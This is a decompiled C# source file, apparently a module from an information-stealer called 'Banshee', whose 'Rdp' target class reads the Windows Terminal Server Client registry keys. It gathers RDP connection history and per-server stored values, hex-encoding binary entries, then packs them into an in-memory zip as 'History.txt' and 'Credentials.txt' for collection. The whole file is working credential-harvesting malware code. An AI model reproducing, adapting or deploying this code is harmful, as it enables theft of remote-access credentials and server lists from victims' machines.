﻿using System;
using System.Text;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A4 RID: 164
	public class Rdp : ITarget
	{
		// Token: 0x060001E7 RID: 487 RVA: 0x00010470 File Offset: 0x00010470
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "Software\\Microsoft\\Terminal Server Client";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
			if (registryKey == null)
			{
				return;
			}
			string text2 = "Rdp";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "RDP";
			RegistryKey registryKey2 = registryKey.OpenSubKey("Default");
			if (registryKey2 != null)
			{
				StringBuilder stringBuilder = new StringBuilder();
				foreach (string name in registryKey2.GetValueNames())
				{
					try
					{
						object value = registryKey2.GetValue(name);
						if (value != null)
						{
							stringBuilder.AppendLine(value.ToString());
						}
					}
					catch
					{
					}
				}
				if (stringBuilder.Length > 0)
				{
					string text3 = text2 + "\\History.txt";
					byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString() + "\n");
					zip.AddFile(text3.Replace('\\', '/'), bytes);
					counterApplications.Files.Add(text + "\\Default => " + text3.Replace('\\', '/'));
				}
			}
			RegistryKey registryKey3 = registryKey.OpenSubKey("Servers");
			if (registryKey3 != null)
			{
				StringBuilder stringBuilder2 = new StringBuilder();
				foreach (string text4 in registryKey3.GetSubKeyNames())
				{
					try
					{
						RegistryKey registryKey4 = registryKey3.OpenSubKey(text4);
						if (registryKey4 != null)
						{
							stringBuilder2.AppendLine(text4 + ":");
							foreach (string text5 in registryKey4.GetValueNames())
							{
								try
								{
									object value2 = registryKey4.GetValue(text5);
									byte[] array2 = value2 as byte[];
									if (array2 != null)
									{
										string str = BitConverter.ToString(array2).Replace("-", "");
										stringBuilder2.AppendLine(text5 + ": " + str);
									}
									else
									{
										stringBuilder2.AppendLine(string.Format("{0}: {1}", text5, value2));
									}
								}
								catch
								{
								}
							}
							stringBuilder2.AppendLine();
						}
					}
					catch
					{
					}
				}
				if (stringBuilder2.Length > 0)
				{
					string text6 = text2 + "\\Credentials.txt";
					byte[] bytes2 = Encoding.UTF8.GetBytes(stringBuilder2.ToString());
					zip.AddFile(text6.Replace('\\', '/'), bytes2);
					counterApplications.Files.Add(text + "\\Servers => " + text6.Replace('\\', '/'));
				}
			}
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add(text2);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
